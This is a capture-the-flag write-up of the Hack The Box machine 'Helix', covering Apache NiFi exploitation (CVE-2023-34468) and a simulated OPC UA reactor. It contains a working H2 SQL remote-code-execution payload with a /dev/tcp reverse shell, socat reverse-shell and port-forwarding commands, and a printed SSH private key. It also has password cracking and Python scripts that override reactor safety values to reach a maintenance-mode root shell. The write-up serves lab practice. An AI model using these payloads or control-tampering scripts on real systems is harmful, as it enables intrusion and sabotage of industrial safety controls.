---
machineName: Helix
difficulty: Medium
Status: Done
OS: Linux
start_time: 2026-05-29T13:28:00
end_time: 2026-05-29T19:14:00
player_position: "1819"
CVEs:
  - "[CVE-2023-34468](https://nvd.nist.gov/vuln/detail/cve-2023-34468)"
CWEs:
  - "[CWE-94](http://cwe.mitre.org/data/definitions/94.html)"
tools:
  - nmap
  - ffuf
  - socat
  - john
exploited_programs:
  - Nifi
  - OPC UA
open_ports:
  - "22"
  - "80"
  - "4840"
aliases:
  - Use modified CVE PoC to get initial access, laterally move to a user with an rsa_key, write a quick python script to trigger win condition on the OPC UA server
tags:
  - "#HTB"
iconurl: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9ef7dfc0282a2ed0dfd37bc16fd15bb5.png
---
<div style="text-align: center;">
  <img
    src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9ef7dfc0282a2ed0dfd37bc16fd15bb5.png"
    width="200"
  >
</div>

# First Enumeration
## Nmap Results

```sh
nmap -sC -sV -Pn -p- -T4 -oN ./recon/helix.htb/nmap/nmap.txt -oX ./recon/helix.htb/nmap/nmap.xml 10.129.5.219
```

| Port | Proto | Service | Product | Version                  | Info                       |
| ---- | ----- | ------- | ------- | ------------------------ | -------------------------- |
| 22   | tcp   | ssh     | OpenSSH | 8.9p1 Ubuntu 3ubuntu0.15 | Ubuntu Linux; protocol 2.0 |
| 80   | tcp   | http    | nginx   | 1.18.0                   | Ubuntu                     |

## VHost Scan
```sh
ffuf -u http://helix.htb -H Host: FUZZ.helix.htb -w /home/drope/Applications/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -ac -of json -o ./recon/helix.htb/ffuf/helix.htb_vhost.json
```

| FUZZ | Status | Lines | Words | Length |
|------|--------|-------|-------|--------|
| flow | 200 | 28 | 110 | 1068 |


On the main page there isn’t anyhting out of the extraordinary, yet when we get to the flow vhost, we find a nifi service running:

When we click on the info section we see: 
```
1.21.0
04/03/2023 21:28:28 UTC
Tagged nifi-1.21.0-RC2
From 892f822 on branch UNKNOWN
Apache NiFi is a framework to support highly scalable and flexible dataflows. It can be run on laptops up through clusters of enterprise class servers. Instead of dictating a particular dataflow or behavior it empowers you to design your own optimal dataflow tailored to your specific environment.
```

We find this [CVE-2026-39816 PoC](https://github.com/ZeroPathAI/nifi-CVE-2026-39816-poc) , the only problem being that it seems like the poc needs a username, and I have no idea who I am.

After seaching a bit further I found this other PoC: [CVE-2023-34468](https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf)

This one works but the steps are not the same, We basically only do the part of `ExecuteSQL` which is already conveniently created for us, and we can modify.

After playing around with multiple payloads this one ended up working:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
String[] command = {"bash", "-c", cmd};
java.util.Scanner s = new
java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
return s.hasNext() ? s.next() : ""; }
$$;
CALL SHELLEXEC('/bin/bash -i >& /dev/tcp/10.10.14.170/4444 0>&1 ')
```

> [!info]
> After running this once, the ALIAS is stored, so if we try and re define it once more it fails.
> From the first run onwards we can just keep the `CALL SHELLEXEC` line to test other commands

This got me a poor shell, so I upgraded it with socat (I did a file transfer with python and wget as usual ):

My machine:
```
./socat file:$(tty),raw,echo=0 tcp-listen:4443,reuseaddr,fork
```

Victim:
```sh
./socat exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane tcp:10.10.14.170:4443
```
./tmp/testsocat exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane tcp:10.10.15.241:4443

# First Foothold

In this part i searched for a while and I was quite stuck, I used linpeass as usual, but it_didn’t pick up on anything unusual.

We see this open port: 
```sh
ss -tnlp
```
```
tcp   LISTEN 0      100             127.0.0.1:4840       0.0.0.0:*
```

I port-forwarded it to my machine as the victim already has socat on it:
```sh
./socat  TCP-LISTEN:14840,reuseaddr,fork TCP:127.0.0.1:4840
```

The previous one-liner is to be ran on the victim, TCP-LISTEN is the port in which all connections get forwarded to 4840.

This port is commonly used by the [OPC UA](https://opcfoundation.org/about/opc-technologies/opc-ua/) protocol.

To interact with it I set up this script which dumps all nodes:

```python
from opcua import Client


URL = "opc.tcp://10.129.5.234:14840"
client = Client(URL)

def explore(node, depth=0):
    try:
        children = node.get_children()
        for c in children:
            print("  " * depth + f"- {c} {c.get_browse_name()}")

            try:
                val = c.get_value()
                print("  " * depth + f"  value: {val}")
            except:
                pass

            explore(c, depth + 1)
    except:
        pass

try:
    client.connect()
    print("[+] Connected")

    objects = client.get_objects_node()

    for child in objects.get_children():
        print("\n[Node]", child, child.get_browse_name())
        explore(child)

finally:
    client.disconnect()
```

This dumps a lot of information, but this part is particularly in link with the context of the machine:

```
[Node] ns=2;i=1 QualifiedName(2:Plant)
- ns=2;i=2 QualifiedName(2:Reactor)
  - ns=2;i=3 QualifiedName(2:TemperatureRaw)
    value: 283.99988915501694
  - ns=2;i=4 QualifiedName(2:Temperature)
    value: 283.99988915501694
  - ns=2;i=5 QualifiedName(2:Pressure)
    value: 68.99995076559756
  - ns=2;i=6 QualifiedName(2:CalibrationOffset)
    value: 0.0
- ns=2;i=7 QualifiedName(2:Safety)
  - ns=2;i=8 QualifiedName(2:RodsInserted)
    value: False
  - ns=2;i=9 QualifiedName(2:EmergencyCooling)
    value: False
  - ns=2;i=10 QualifiedName(2:TripActive)
    value: False
- ns=2;i=11 QualifiedName(2:Control)
  - ns=2;i=12 QualifiedName(2:Mode)
    value: NORMAL
  - ns=2;i=13 QualifiedName(2:TestOverride)
    value: False
  - ns=2;i=14 QualifiedName(2:ResetTrip)
    value: False
```

At this point I didn’t know what to do anymore, I didn’t found anything else I could do from the **nifi** user, so I tried to get acces to the `operator`

After looking everywhere I found an SSH key:

```sh
nifi@helix:/usr/local/sbin$ find / -type f -iname "*id_ed*" 2>/dev/null
/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
<ifi-1.21.0/support-bundles/operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
nifi@helix:/usr/local/sbin$

```

As usual we `chmod 600` it and connect with `ssh -i`


# Second Enumeration

We see there’s a lot of stuff in the user machine, we download it to our local machine: 
```sh
scp -i Credentials/operator_id_rsa 'operator@10.129.5.234:~/*' .
```
```
Operator Control & Safety Guide.pdf        100%   28KB 530.4KB/s   00:00
control systems diagram.png                100%  899KB   5.6MB/s   00:00
user.txt                                   100%   33     1.1KB/s   00:00
```

We see that the pdf is actually password protected, we crack it with john:

```sh
python3 ~/Applications/john-jumbo/run/pdf2john.py Operator\ Control\ \&\ Safety\ Guide.pdf > operator_to_crak
```
```sh
john --format=pdf --wordlist=/home/drope/Applications/rockyou.txt operator_to_crak          
```
```
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 6 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
operator1        (?)
1g 0:00:00:28 DONE (2026-05-29 17:43) 0.03485g/s 9208p/s 9208c/s 9208C/s paigerox..nsyncj
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed
```

We succeeded in getting the password!

We try this as soon as I get the password: 
```sh
sudo -l 
```
```sh
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console

```

We see the following script:
```bash
#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(read_until)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))

echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"
echo "[!] Session will be terminated automatically"

# Unique scope name
SCOPE="helix-maint-$$"

# Launch an interactive root shell attached to THIS TTY, in its own systemd scope
systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes \
  /bin/bash -p -i

# If systemd-run returns, the shell exited.
exit 0
```

We see that basically is a script that allows us to get a root shell, as soon as a trigger condition is met.

When we checked the files in the `/home` of **operator** we see an image and a pdf file:

![[images/htb_images/Pasted image 20260529210048.png]]

The PDF has way more pages, but I’ll explain it further on the Privilege Escalation Part

![[images/htb_images/Pasted image 20260529210308.png]]

# Privilege Escalation

The pdf tells us that the system has 3 Modes:
## Normal Mode
I won’t go into detail, but this is the mode we have to go back to if we set accidentally trigger the Safety Trip
## Maintenance Mode
![[images/htb_images/Pasted image 20260529210617.png]]

This is the mode we want to trigger, and the mode that would give us root on the machine with the `sudo -l` script.

## Safety Trip
![[images/htb_images/Pasted image 20260529210858.png]]

This is the state that we want to avoid, as it would close the maintenance window.

So I whipped out this script, to try to get to the maintenance window, by rising the CalibrationOffset and thus the Temperature as well:

```python
from opcua import Client
import time
import os

url = "opc.tcp://10.129.5.234:14840"

client = Client(url)
client.connect()
print("[+] Connected")

nodes = {
    "TempRaw": "ns=2;i=3",
    "Temp": "ns=2;i=4",
    "Pressure": "ns=2;i=5",
    "Offset": "ns=2;i=6",
    "Rods": "ns=2;i=8",
    "Cooling": "ns=2;i=9",
    "Trip": "ns=2;i=10",
    "Mode": "ns=2;i=12",
    "Override": "ns=2;i=13",
}

node_objs = {k: client.get_node(v) for k, v in nodes.items()}

def clear():
    os.system("clear")

offset = 0.0

try:
    # --- Initial control setup ---
    node_objs["Mode"].set_value("MAINTENANCE")
    node_objs["Override"].set_value(True)

    print("[+] Mode set to MAINTENANCE")
    print("[+] Override enabled")

    i = 0

    while True:
        values = {}

        # --- Read all values safely ---
        for k, node in node_objs.items():
            try:
                values[k] = node.get_value()
            except:
                values[k] = "ERR"

        # --- Calibration control logic ---
        try:
            temp = float(values["Temp"])
            pressure = float(values["Pressure"])

            cooling = values['Cooling'] or values['Rods']
            if (temp < 300) and (pressure < 73) and (i % 3 == 0) and not cooling:
                offset += 0.5
                node_objs["Offset"].set_value(offset)

        except:
            pass

        # --- Display ---
        clear()
        print("=== HELIX REACTOR STATUS ===\n")

        print(f"TempRaw     : {values['TempRaw']}")
        print(f"Temp        : {values['Temp']}")
        print(f"Pressure    : {values['Pressure']}")
        print(f"Offset      : {values['Offset']} (local: {offset})\n")

        print(f"Mode        : {values['Mode']}")
        print(f"Override    : {values['Override']}")
        print(f"Rods        : {values['Rods']}")
        print(f"Cooling     : {values['Cooling']}")
        print(f"TripActive  : {values['Trip']}\n")

        print("============================")

        i += 1
        time.sleep(1)

finally:
    client.disconnect()
    print("Disconnected")
```

Basically once the Rods and Cooling rows print **True**, we can launch `sudo /usr/local/sbin/helix-maint-console`.

Needles to say, before getting to this final script, I went through many others, something interesting to note, is that if you raise the temperature too slowly, the Cooling system and Rods will activate, yet the `sudo -l` script would say that the maintenance windows is closed.

Also when I messed up and triggered the safety trip I used this script to reset it:
```python
from opcua import Client

url = "opc.tcp://10.129.5.234:14840"

client = Client(url)
client.connect()

print("[+] Connected")

# Nodes
temp = client.get_node("ns=2;i=4")        # Temperature
pressure = client.get_node("ns=2;i=5")    # Pressure
mode = client.get_node("ns=2;i=12")       # Mode
override = client.get_node("ns=2;i=13")   # TestOverride
offset = client.get_node("ns=2;i=6")      # CalibrationOffset
reset_trip = client.get_node("ns=2;i=14") # ResetTrip

try:
    t = temp.get_value()
    p = pressure.get_value()
    m = mode.get_value()
    o = override.get_value()
    c = offset.get_value()

    print(f"Temperature: {t}")
    print(f"Pressure: {p}")
    print(f"Mode: {m}")
    print(f"TestOverride: {o}")
    print(f"CalibrationOffset: {c}")

    safe = (
        t < 288 and
        p < 70 and
        m == "NORMAL" and
        o is False and
        c == 0.0
    )

    if safe:
        print("System is SAFE — attempting ResetTrip")
        reset_trip.set_value(True)
        print("ResetTrip sent")
    else:
        print("System NOT safe for reset")
        if t >= 288:
            print("  - Temperature too high")
        if p >= 70:
            print("  - Pressure too high")
        if m != "NORMAL":
            print("  - Mode not NORMAL")
        if o:
            print("  - TestOverride still enabled")
        if c != 0.0:
            print("  - CalibrationOffset not zero")

finally:
    client.disconnect()
    print("Disconnected")
```


# Understanding the Attack Chain
Now onto an overview of the complete attack chain, as well as a detailed look into any PoC.
___
There’s a really good explanation here: https://exceptionfactory.com/posts/2023/10/07/firsthand-analysis-of-apache-nifi-vulnerability-cve-2023-34468/


